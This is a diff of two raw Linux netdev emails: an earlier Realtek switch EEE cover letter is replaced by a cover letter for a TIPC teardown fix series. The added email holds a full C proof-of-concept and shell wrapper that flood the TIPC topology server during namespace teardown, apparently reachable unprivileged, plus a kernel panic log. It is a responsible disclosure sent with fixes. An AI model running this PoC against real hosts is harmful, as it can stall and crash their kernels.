@@ -1,51 +1,80 @@
-Received: from mx1.white.stw.pengutronix.de (mx1.white.stw.pengutronix.de [185.203.200.13])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pj2-f12.google.com (mail-pj2-f12.google.com [74.125.227.140])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 82EA41C6FF5;
-	Fri, 18 Sep 2026 09:17:25 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=185.203.200.13
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2D52D3126D6
+	for <netdev@vger.kernel.org>; Fri, 18 Sep 2026 09:21:29 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.140
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789723049; cv=none; b=U3NcUbvBwRexDDJ2FIDYKd67I+mXEqmVmrdhxf9PbRT/+OHarTawZHkaPbA/MGYIMDDIVDLUt3ZgDeMlqCuamVzhyz0oCDAVZlWYfGX3/WCjC7RraNitYrqNKhOS4etL7hO8AoBi/856fuDpRrwZE+FjgqNeb7UKZ/fCxn6NHFw=
+	t=1789723291; cv=none; b=EONQzIyKAuILvSqKPtGHOd06awq/YxminX/Pfz48qZC0p5zL/dZmxZ1RTmI8EvRE/UFz/Xs4rs2OPNW1rl/MAfIESMFdA2w3V/55/zVF4WO6AjGEw+jS9LbABirEo01cxdWWRnkzQtB1mwf11tjBrbSWJOv/WiIho5VpESJ4kmg=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789723049; c=relaxed/simple;
-	bh=4mZpkxATI4qiyTSXSJVGZ61KAftzgBuhrIfRNPs44+E=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=cRynY47OdsSS9ztGW6PWYb9COA/ZjtzUkDrUgI4M7jhCnUqbJ5eiO31FGpt9yKyhnIuVURMNH6Cf2wCOYZMJhQc43JAvPI5MUCgLKHn/2yJkckNeHKwHcg70C+H+IR+HPROrKV+lLn9GQfAZ/6QDO7BzateQZjYip3UkHDAgktU=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=pengutronix.de; spf=pass smtp.mailfrom=pengutronix.de; arc=none smtp.client-ip=185.203.200.13
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=pengutronix.de
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=pengutronix.de
-Received: from drehscheibe.grey.stw.pengutronix.de (drehscheibe.grey.stw.pengutronix.de [IPv6:2a0a:edc0:0:c01:1d::a2])
-	(Authenticated sender: relay-from-drehscheibe.grey.stw.pengutronix.de)
-	by mx1.white.stw.pengutronix.de (Postfix) with ESMTPSA id 621DD200109;
-	Fri, 18 Sep 2026 11:17:23 +0200 (CEST)
-Received: from dude04.red.stw.pengutronix.de ([2a0a:edc0:0:1101:1d::ac] helo=dude04)
-	by drehscheibe.grey.stw.pengutronix.de with esmtps  (TLS1.3) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
-	(Exim 4.96)
-	(envelope-from <ore@pengutronix.de>)
-	id 1x7Uih-001XsG-0w;
-	Fri, 18 Sep 2026 11:17:23 +0200
-Received: from ore by dude04 with local (Exim 4.98.2)
-	(envelope-from <ore@pengutronix.de>)
-	id 1x7Uih-0000000DipI-0rXC;
-	Fri, 18 Sep 2026 11:17:23 +0200
-From: Oleksij Rempel <o.rempel@pengutronix.de>
-To: Linus Walleij <linusw@kernel.org>,
-	Luiz Angelo Daros de Luca <luizluca@gmail.com>,
-	Andrew Lunn <andrew@lunn.ch>,
-	Vladimir Oltean <olteanv@gmail.com>,
-	"David S. Miller" <davem@davemloft.net>,
+	s=arc-20240116; t=1789723291; c=relaxed/simple;
+	bh=zA71H+XKmHG7bF+w7NGclfrpmryAAD1Ig9ehUUo302A=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=A3rjQjWnda74/Nq/tyqhKZ+buX7h2BK3XI27Nj51KaG4QQ0/adt6sILDuE+d5VK0J27r/sHTs0uVMFmzijWYMJOCaBZm7llhMEJNMvnURapYA/2AcL06wa5swj3Ev0PVBAaj4w503pCtVuqNDpnt9vEWiH5YxErUASAqjZs4W5Y=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Q+C4mnIQ; arc=none smtp.client-ip=74.125.227.140
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+Authentication-Results: smtp.subspace.kernel.org;
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Q+C4mnIQ"
+Received: by mail-pj2-f12.google.com with SMTP id d9443c01a7336-2d747f05ffdso3706215ad.1
+        for <netdev@vger.kernel.org>; Fri, 18 Sep 2026 02:21:29 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1789723289; x=1790328089; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=Mly5Dxu0mfsTrvWw0/D0BE3Bqt5H5t1/6wpioo+ck4Y=;
+        b=Q+C4mnIQdguANAwHj9/BxbPKd5iQg+od3CsGq2hoLuD4Xrwi8eHqxs6ZqLyTzCNiwX
+         T9OvU9JDMIG3DihTscUTDXixsNf7Uol/g+tX9Zlm7RtEb5R5QrYubqVee5r8v9TuvChk
+         vT9KKisWzlgU2Su5HUJWcrQLd4pxzZ/jTv+CzOTmfVca7bYuGrfpb2pLq0k+xSTUQp6A
+         ZsFCox8H+G4CXRyse7omz/SU5c+nPnprE4o7C0AMOc02XIvxS5y7pLWxCShqUdfa50KZ
+         zhzb6aaO5ndEeQgrL1H44ywjuWFnS7yA31JQd8ieOSHtGh9WYfWBjpwTfaEKOr08hf2/
+         iLpA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1789723289; x=1790328089;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=Mly5Dxu0mfsTrvWw0/D0BE3Bqt5H5t1/6wpioo+ck4Y=;
+        b=SRQ6z4Q9bFV1NWV6IFQ2vq0NKXltOrEIOyDIg49+bq5wvDeRtWUyhAWe3opwNgv73y
+         8gLI+Pp3H7UzzpBAwjSw7eDTNL7XSaVPhVIAlV4lMCUr1tMkSquqdgR3RzgQ+XjH/x0i
+         e28il4C9yA6OPQw5Uo1pi+bkhKWoNd6jfHBri8pfo5ZYxgpLm8L6Zug20zcgcuU7/324
+         1MoZrRRYYu+XTK9StJkTEPCyYyn0C2fR+Cc5Bi9EIhURlv2EJdnNNiQz/oos+UYiSyNI
+         JGknnf6xa13WUQ2ea+kBo0h/LgNxq2HDaJamBbg8TX8CeomF+ZPxHEGqtBbZuqM1LTa0
+         TD1g==
+X-Gm-Message-State: AFuF++kuAdHf1v0JoSIkzhBgZ40fjhmfkZFdGBkuOCuXJl4jZWkIYMH9
+	ScH7NVAtY1F/4FUmfs2SE5l22hP6REKMZQSItkocUpilbU3EGZcPj4mbpdZ2niKQqgjxP6Sz
+X-Gm-Gg: AYBFou0mweuF2mBR3SV+Gc04s2R6a4/GavV0lNrh09iADe4lud4kuKDKN2gw4D3vvJC
+	8YNyqpnWnL4rPzJb/LBGR+yLeBEDQmB1of/N/FzgQCQ7JZwKQkCtEGBt3UICFO0kKJGMiuiYgjZ
+	JsNdSGG4gjXM7zqh6Qer790CN83oUVCacDOY5o3ezvZ3kupEOgMaDxR43IxfSv4gXWLm2iBy/Va
+	C9SrU1n7utb++vDaENFEHNuNxPs5G7N/xxN58MvbAO0Jz1GxnJRAi+6i4r13UPL9GWvDc29Dlqp
+	+L0ujQrvCdyJ8ZEN+yJ5cLFDcPN6v3rg4R9GAi1hf7gYhZ/jCGLdpxKEvMlJD7OUKRWzxWsdXSG
+	K2qeig5wy199wqCUeQ2ZbWE/JbNZV3NZWt9vXQDZW/R9ST54io/v5V93lvwPojzBfu/k/5uytta
+	xWe888pUKlBKlSITBWbx94PzEMDx2FPw9dokVHDOIISRYYbFMarCEN2BmVnC9NE4y9TDtOzRxux
+	uSb96ecmLidXhTPMjghOfF1bHck9upjhPzZQuZ2xLGwNazS9T7jmRAZSCX3lUSltgoyA5osGmBw
+X-Received: by 2002:a17:90b:3909:b0:39e:248e:fdeb with SMTP id 98e67ed59e1d1-39e54d10e41mr4446376a91.19.1789723288585;
+        Fri, 18 Sep 2026 02:21:28 -0700 (PDT)
+Received: from lenovo-thinkbook.lenovo.com (n11212025079.netvigator.com. [112.120.25.79])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e6137e111sm677341a91.1.2026.09.18.02.21.19
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Fri, 18 Sep 2026 02:21:25 -0700 (PDT)
+From: Yuqi Xu <xuyuqiabc@gmail.com>
+To: netdev@vger.kernel.org
+Cc: Jon Maloy <jmaloy@redhat.com>,
+	Tung Quang Nguyen <tung.quang.nguyen@est.tech>,
+	"David S . Miller" <davem@davemloft.net>,
 	Eric Dumazet <edumazet@google.com>,
 	Jakub Kicinski <kuba@kernel.org>,
-	Paolo Abeni <pabeni@redhat.com>
-Cc: Oleksij Rempel <o.rempel@pengutronix.de>,
-	kernel@pengutronix.de,
-	linux-kernel@vger.kernel.org,
-	Ahmad Fatoum <a.fatoum@pengutronix.de>,
-	=?UTF-8?q?Alvin=20=C5=A0ipraga?= <alvin.sipraga@analog.com>,
-	netdev@vger.kernel.org
-Subject: [PATCH net-next v4 0/3] net: dsa: realtek: EEE support for RTL8365MB-VC
-Date: Fri, 18 Sep 2026 11:17:19 +0200
-Message-ID: <20260918091722.3270534-1-o.rempel@pengutronix.de>
-X-Mailer: git-send-email 2.47.3
+	Paolo Abeni <pabeni@redhat.com>,
+	Simon Horman <horms@kernel.org>,
+	Ying Xue <ying.xue@windriver.com>,
+	Parthasarathy Bhuvaragan <parthasarathy.bhuvaragan@ericsson.com>,
+	Kuniyuki Iwashima <kuniyu@google.com>,
+	stable@vger.kernel.org,
+	Vega <vega@nebusec.ai>,
+	Ren Wei <enjou1224z@gmail.com>
+Subject: [PATCH net 0/2] tipc: fix connection lifetime during netns teardown
+Date: Fri, 18 Sep 2026 17:21:11 +0800
+Message-ID: <cover.1789722780.git.xuyuqiabc@gmail.com>
+X-Mailer: git-send-email 2.55.0
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -54,23 +83,288 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-On these switches EEE is enabled by default, but so far it is neither
-visible nor controllable from user space. This series wires EEE up to
-phylib/phylink on the RTL8365MB-VC integrated-PHY ports so it can be
-observed and controlled per port via ethtool
+Hi Linux kernel maintainers,
 
-Oleksij Rempel (3):
-  net: phy: realtek: use C45 for RTL8365MB-VC internal PHY MMD access
-  net: dsa: realtek: rtl8365mb: extract PHY OCP address halves with
-    FIELD_GET
-  net: dsa: realtek: rtl8365mb: add EEE support
+We found and validated an issue in net/tipc/topsrv.c. The bug is
+reachable by an unprivileged user via user and network namespaces
+(CLONE_NEWUSER|CLONE_NEWNET); the reproducer below also supports a
+root mode.
 
- drivers/net/dsa/realtek/realtek.h        |   4 +
- drivers/net/dsa/realtek/rtl8365mb_main.c | 137 ++++++++++++++++++++++-
- drivers/net/dsa/realtek/rtl83xx.c        |  20 ++++
- drivers/net/phy/realtek/realtek_main.c   |   2 +
- 4 files changed, 161 insertions(+), 2 deletions(-)
+We've tested it, and it should not affect any other functionality.
 
---
-2.47.3
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
+
+---- details below ----
+
+Bug details:
+
+`tipc_topsrv_stop()` can tear the topology server down in two unsafe
+ways. It destroys `srv->rcv_wq`/`srv->send_wq` while the listener
+socket still has its data-ready callback and `sk_user_data` installed,
+so `tipc_topsrv_listener_data_ready()` can still queue `srv->awork` on
+a freed workqueue. It also walks `conn_idr` by incrementing a numeric
+ID while holding `idr_lock`, which can scan a large range of unused IDs
+without letting a connection's final reference release make progress,
+and it can resurrect an entry whose last reference was already dropped.
+
+Reproducer:
+
+#!/bin/sh
+set -eu
+
+SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
+
+ITERATIONS="${1:-6000}"
+THREADS="${2:-4}"
+RUNTIME_USEC="${3:-20000}"
+MODE="${MODE:-root}"              # root | userns
+STALL_TIMEOUT="${STALL_TIMEOUT:-20}"
+CC_BIN="${CC:-gcc}"
+
+cd "$SCRIPT_DIR"
+
+"$CC_BIN" -O2 -Wall -pthread -o poc poc.c
+
+if [ "${SET_PANIC_ON_RCU_STALL:-1}" = "1" ] && [ "$(id -u)" -eq 0 ]; then
+	sysctl -w kernel.panic_on_rcu_stall=1 >/dev/null 2>&1 || true
+	if [ -w /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout ]; then
+		echo "$STALL_TIMEOUT" > /sys/module/rcupdate/parameters/rcu_cpu_stall_timeout
+	fi
+fi
+
+if [ "$MODE" = "userns" ]; then
+	CMD="./poc --userns -i $ITERATIONS -t $THREADS -r $RUNTIME_USEC"
+else
+	CMD="./poc -i $ITERATIONS -t $THREADS -r $RUNTIME_USEC"
+fi
+
+echo "[*] running: $CMD"
+exec sh -c "$CMD"
+
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+
+
+#define _GNU_SOURCE
+
+#include <errno.h>
+#include <getopt.h>
+#include <linux/tipc.h>
+#include <pthread.h>
+#include <sched.h>
+#include <stdatomic.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+static atomic_int stop_flag;
+
+struct run_cfg {
+	int iterations;
+	int threads;
+	int runtime_usec;
+	int ns_flags;
+};
+
+static void usage(const char *prog)
+{
+	fprintf(stderr,
+		"Usage: %s [-i iterations] [-t threads] [-r runtime_usec] [--userns]\n"
+		"  -i, --iterations   number of fork/teardown cycles (default: 6000)\n"
+		"  -t, --threads      flood worker threads per cycle (default: 4)\n"
+		"  -r, --runtime-us   worker runtime per cycle in usec (default: 20000)\n"
+		"  -U, --userns       use CLONE_NEWUSER|CLONE_NEWNET (for non-root)\n",
+		prog);
+}
+
+static void parse_args(int argc, char **argv, struct run_cfg *cfg)
+{
+	static const struct option long_opts[] = {
+		{ "iterations", required_argument, NULL, 'i' },
+		{ "threads", required_argument, NULL, 't' },
+		{ "runtime-us", required_argument, NULL, 'r' },
+		{ "userns", no_argument, NULL, 'U' },
+		{ "help", no_argument, NULL, 'h' },
+		{ 0, 0, 0, 0 },
+	};
+	int c;
+
+	cfg->iterations = 6000;
+	cfg->threads = 4;
+	cfg->runtime_usec = 20000;
+	cfg->ns_flags = CLONE_NEWNET;
+
+	while ((c = getopt_long(argc, argv, "i:t:r:Uh", long_opts, NULL)) != -1) {
+		switch (c) {
+		case 'i':
+			cfg->iterations = atoi(optarg);
+			break;
+		case 't':
+			cfg->threads = atoi(optarg);
+			break;
+		case 'r':
+			cfg->runtime_usec = atoi(optarg);
+			break;
+		case 'U':
+			cfg->ns_flags = CLONE_NEWUSER | CLONE_NEWNET;
+			break;
+		case 'h':
+		default:
+			usage(argv[0]);
+			exit(c == 'h' ? 0 : 1);
+		}
+	}
+
+	if (cfg->iterations <= 0 || cfg->threads <= 0 || cfg->runtime_usec < 0) {
+		usage(argv[0]);
+		exit(1);
+	}
+}
+
+static void *flood_worker(void *arg)
+{
+	uintptr_t tid = (uintptr_t)arg;
+	struct sockaddr_tipc sa;
+	struct tipc_subscr sub;
+
+	memset(&sa, 0, sizeof(sa));
+	sa.family = AF_TIPC;
+	sa.addrtype = TIPC_SERVICE_ADDR;
+	sa.scope = TIPC_NODE_SCOPE;
+	sa.addr.name.name.type = TIPC_TOP_SRV;
+	sa.addr.name.name.instance = TIPC_TOP_SRV;
+
+	memset(&sub, 0, sizeof(sub));
+	sub.seq.type = 0x20000 + (uint32_t)tid;
+	sub.seq.lower = 1;
+	sub.seq.upper = 1;
+	sub.timeout = 0xffffffffu;
+	sub.filter = TIPC_SUB_SERVICE;
+
+	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
+		int fd = socket(AF_TIPC, SOCK_SEQPACKET | SOCK_NONBLOCK, 0);
+
+		if (fd < 0)
+			continue;
+
+		(void)connect(fd, (struct sockaddr *)&sa, sizeof(sa));
+		(void)send(fd, &sub, sizeof(sub), MSG_DONTWAIT);
+		close(fd);
+	}
+
+	return NULL;
+}
+
+static void run_one_iteration(const struct run_cfg *cfg)
+{
+	pthread_t *tids;
+	int i;
+
+	if (unshare(cfg->ns_flags) < 0)
+		_exit(111);
+
+	tids = calloc((size_t)cfg->threads, sizeof(*tids));
+	if (!tids)
+		_exit(1);
+
+	atomic_store_explicit(&stop_flag, 0, memory_order_relaxed);
+	for (i = 0; i < cfg->threads; i++)
+		pthread_create(&tids[i], NULL, flood_worker,
+			       (void *)(uintptr_t)(i + 1));
+
+	usleep((useconds_t)cfg->runtime_usec);
+
+	_exit(0);
+}
+
+int main(int argc, char **argv)
+{
+	struct run_cfg cfg;
+	int i;
+	int ns_failures = 0;
+
+	parse_args(argc, argv, &cfg);
+
+	for (i = 0; i < cfg.iterations; i++) {
+		pid_t pid = fork();
+		int st;
+
+		if (pid == 0)
+			run_one_iteration(&cfg);
+		if (pid < 0)
+			return 1;
+
+		if (waitpid(pid, &st, 0) < 0)
+			return 1;
+
+		if (WIFEXITED(st) && WEXITSTATUS(st) == 111)
+			ns_failures++;
+
+		if ((i % 200) == 0)
+			fprintf(stderr, "iter=%d ns_failures=%d\n", i, ns_failures);
+	}
+
+	if (ns_failures == cfg.iterations) {
+		fprintf(stderr,
+			"all iterations failed to create namespaces (EPERM likely)\n");
+		return 2;
+	}
+
+	return 0;
+}
+
+
+------END poc.c--------
+
+----BEGIN crash log----
+
+
+[  292.540819][    C1] rcu: INFO: rcu_preempt self-detected stall on CPU
+[  292.647997][    C1] Workqueue: tipc_rcv tipc_topsrv_accept
+[  292.708934][    C0] Workqueue: netns cleanup_net
+[  292.709097][    C0]  <TASK>
+[  292.709101][    C0]  __radix_tree_lookup+0xb7/0x290
+[  292.709134][    C0]  tipc_topsrv_exit_net+0x19c/0x4e0
+[  292.709169][    C0]  ops_exit_list+0xc0/0x180
+[  292.709192][    C0]  cleanup_net+0x5b9/0xbd0
+[  292.709217][    C0]  process_one_work+0x981/0x1930
+[  292.709275][    C0]  worker_thread+0x729/0x10e0
+[  292.709314][    C0]  kthread+0x338/0x410
+[  292.709364][    C0]  ret_from_fork_asm+0x11/0x20
+[  292.709383][    C0]  </TASK>
+[  292.831321][    C1] Kernel panic - not syncing: RCU Stall
+[  292.834975][    C1] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996)
+[  292.839167][    C1] Call Trace:
+[  292.875653][    C1]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
+[  292.906505][    C1]  tipc_topsrv_accept+0x104/0x300
+[  292.909515][    C1]  process_one_work+0x981/0x1930
+[  292.919937][    C1]  ret_from_fork+0x4b/0x80
+[  292.926345][    C1] Kernel Offset: disabled
+[  292.927571][    C1] Rebooting in 86400 seconds..
+
+
+-----END crash log-----
+
+Best regards,
+Yuqi Xu
+
+Yuqi Xu (2):
+  tipc: stop the listener before draining connections
+  tipc: make conn_idr teardown safe
+
+ net/tipc/topsrv.c | 27 ++++++++++++++++++++-------
+ 1 file changed, 20 insertions(+), 7 deletions(-)
+
+
+base-commit: 24ef02f934eeb48830cff6b739abc3c62b1d107b
+-- 
+2.55.0
 
